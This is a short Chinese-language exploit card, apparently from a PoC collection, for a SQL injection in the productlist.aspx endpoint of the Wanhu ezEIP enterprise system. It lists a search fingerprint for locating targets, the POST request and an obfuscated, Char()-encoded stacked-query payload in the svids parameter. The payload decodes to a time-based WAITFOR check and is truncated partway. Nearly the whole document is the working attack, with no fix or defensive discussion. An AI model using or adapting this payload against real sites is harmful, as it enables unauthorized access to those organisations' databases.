# 万户ezEIP企业管理系统productlist.aspxSQL注入漏洞

- **系统**：万户ezEIP企业管理系统productlist.aspx　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="ezEIP"`
- **请求**：`POST /shop/productlist.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
ob=price&price=asc&svids=-1%29%3BDECLARE+%40%40proc_name+VARCHAR%28301%29%3BSet+%40%40proc_name%3DChar%28115%29%252bChar%28101%29%252bChar%28108%29%252bChar%28101%29%252bChar%2899%29%252bChar%28116%29%252bChar%2832%29%252bChar%2849%29%252bChar%2832%29%252bChar%28119%29%252bChar%28104%29%252bChar%28101%29%252bChar%28114%29%252bChar%28101%29%252bChar%2832%29%252bChar%2849%29%252bChar%2861%29%252bChar%2849%29%252bChar%2832%29%252bChar%2887%29%252bChar%2865%29%252bChar%2873%29%252bChar%2884%29%252bChar%2870%29%252bChar%2879%29%252bChar%2882%29%252bChar%2832%29%252bChar%2868%29%252bChar%2869%29%252…（脚本共 824 字，完整版见原文）
```
- **预期**：200　|　—